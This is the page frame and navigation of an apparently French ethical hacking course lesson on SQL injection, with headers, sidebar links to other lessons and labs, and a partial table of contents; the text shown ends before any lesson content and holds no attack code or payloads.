
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Étienne Rivard">
      
      
        <link rel="canonical" href="https://piratage.kerzo.ca/lecons/20_Injection_SQL/">
      
      
        <link rel="prev" href="../19_Vulnerabilites_Web/">
      
      
        <link rel="next" href="../10_Cryptographie/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.31">
    
    
      
        <title>Injections SQL - Cours de piratage éthique</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.3cba04c6.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#injections-sql" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Cours de piratage éthique" class="md-header__button md-logo" aria-label="Cours de piratage éthique" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cours de piratage éthique
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Injections SQL
            
          </span>
        </div>
      </div>
    </div>
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Cours de piratage éthique" class="md-nav__button md-logo" aria-label="Cours de piratage éthique" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Cours de piratage éthique
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Page principale
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../horaire/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Horaire
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Leçons
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Leçons
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01_Introduction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01b_Mots_de_passe/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mots de passe
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../02_Reconnaissance_passive/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance passive
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03_Reconnaissance_active/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance active
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../04_Ecoute_reseau/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Écoute du réseau
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05_Gestion_de_risques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gestion de risques
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06_Intro_Metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction à Metasploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../07_Strategies_sauvegarde/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Stratégies de sauvegarde
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08_Pare_feu/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pare-feux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../11_Inventaire_Actifs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Inventaire d'actifs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../19_Vulnerabilites_Web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnérabilités Web
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Injections SQL
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Injections SQL
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#notions-de-base" class="md-nav__link">
    <span class="md-ellipsis">
      Notions de base
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Notions de base">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#instructions-de-commentaires-dans-sqli" class="md-nav__link">
    <span class="md-ellipsis">
      Instructions de commentaires dans SQLi
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#differentes-facons-dassigner-des-valeurs-dans-la-requete" class="md-nav__link">
    <span class="md-ellipsis">
      Différentes façons d'assigner des valeurs dans la requête
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buts-de-linjection-sql" class="md-nav__link">
    <span class="md-ellipsis">
      Buts de l'injection SQL
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-active" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance active
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance active">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-type-dassignation-des-valeurs" class="md-nav__link">
    <span class="md-ellipsis">
      1. Type d'assignation des valeurs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-determiner-le-nombre-de-colonnes" class="md-nav__link">
    <span class="md-ellipsis">
      2. Déterminer le nombre de colonnes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-trouver-les-informations-sur-la-base-de-donnees" class="md-nav__link">
    <span class="md-ellipsis">
      3. Trouver les informations sur la base de données
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-faire-la-liste-des-tables" class="md-nav__link">
    <span class="md-ellipsis">
      4. Faire la liste des tables
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-faire-la-liste-des-champs-des-tables" class="md-nav__link">
    <span class="md-ellipsis">
      5. Faire la liste des champs des tables
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#extraction-de-donnees" class="md-nav__link">
    <span class="md-ellipsis">
      Extraction de données
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#utilisation-doutils-automatises-pour-linjection-sql" class="md-nav__link">
    <span class="md-ellipsis">
      Utilisation d'outils automatisés pour l'injection SQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Utilisation d'outils automatisés pour l'injection SQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#firefox" class="md-nav__link">
    <span class="md-ellipsis">
      Firefox
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    <span class="md-ellipsis">
      SQLMap
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#testez-vos-connaissances" class="md-nav__link">
    <span class="md-ellipsis">
      Testez vos connaissances
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../10_Cryptographie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptographie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../13_Penetration_reseau_sans_fils/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pénétration de réseaux sans-fils
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../14_Tests_penetration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tests de pénétration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../17_Detection_intrusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Détection d'intrusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../18_Lois/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lois
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../09_Antivirus_et_PDF_malicieux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Antivirus et PDF malicieux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../10_Hameconnage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hameçonnage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../21_Securiser_Apache/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sécuriser serveur Apache
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../22_Programmer_application_securisee/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Programmer application sécurisée
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../23_Protection_Injection_SQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Protection injection SQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../24_Chiffrement_et_donnees_sensibles/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chiffrement et données sensibles
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../25_Authentification/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentification
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../99_CacherCodeMalicieux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cacher du code malicieux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../99_Attaque_Uber/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attaque de Uber
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Exercices
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Exercices
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/01_Exercices_Laboratoire/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bâtir le laboratoire
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/02_Exercices_Reconnaissance_passive/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance passive
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/03_Reconnaissance_active/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reconnaissance active
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/04_Ecoute_reseau/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Écoute du réseau
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/05_Gestion_de_risques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gestion du risque
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/06_Intro_Metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Intro à Metasploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/dossier_securite/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dossier de sécurité
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/07_strategie_sauvegarde/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Stratégie de sauvegarde
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/08_Pare_feu/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pare-feux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/10_classification_actifs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Classification d'actifs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/19_Vulnerabilites_Web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnérabilités Web
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/20_Injection_SQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Injections SQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/10_Cryptographie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptographie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/13_Penetration_reseau_sans_fils/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pénétration réseau sans-fils
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/14_Tests_penetration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tests de pénétration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/17_Detection_intrusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Détection d'intrusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/18_Lois/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lois
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/09_PDF_Malicieux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PDF Malicieux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/10_Hameconnage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hameçonnage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/21_Securiser_Apache/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sécuriser serveur Apache
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/22_Programmer_application_securisee/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Programmer application sécurisée
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/23_Proteger_injection_SQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Protection injection SQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/24_Chiffrement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chiffrement
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../exercices/25_Authentification/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentification
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Outils
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Outils
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../outils/cartographie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cartographie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Labo
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Labo
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_Kali_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kali
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_Metasploitable_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploitable
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_WindowsXP_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows XP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_Gogo_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gogo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_DunderMifflin/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dundermifflin
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_Snort_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snort
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/Installation_MonMur_VirtualBox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MonMur
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/capturer_trafic_virtualbox/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Capturer le trafic dans VirtualBox
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../labo/kali_demarrer_bd_postgresql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Démarrer PostGreSQL
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Évaluations
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Évaluations
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evaluations/evaluation_sommative/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Évaluation sommative
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evaluations/examen_mi_session/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Examen mi-session
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../evaluations/Hack_lab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hack Lab
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#notions-de-base" class="md-nav__link">
    <span class="md-ellipsis">
      Notions de base
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Notions de base">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#instructions-de-commentaires-dans-sqli" class="md-nav__link">
    <span class="md-ellipsis">
      Instructions de commentaires dans SQLi
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#differentes-facons-dassigner-des-valeurs-dans-la-requete" class="md-nav__link">
    <span class="md-ellipsis">
      Différentes façons d'assigner des valeurs dans la requête
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buts-de-linjection-sql" class="md-nav__link">
    <span class="md-ellipsis">
      Buts de l'injection SQL
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance-active" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance active
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance active">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-type-dassignation-des-valeurs" class="md-nav__link">
    <span class="md-ellipsis">
      1. Type d'assignation des valeurs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-determiner-le-nombre-de-colonnes" class="md-nav__link">
    <span class="md-ellipsis">
      2. Déterminer le nombre de colonnes
    </span>
  </a>
  
</li>
        
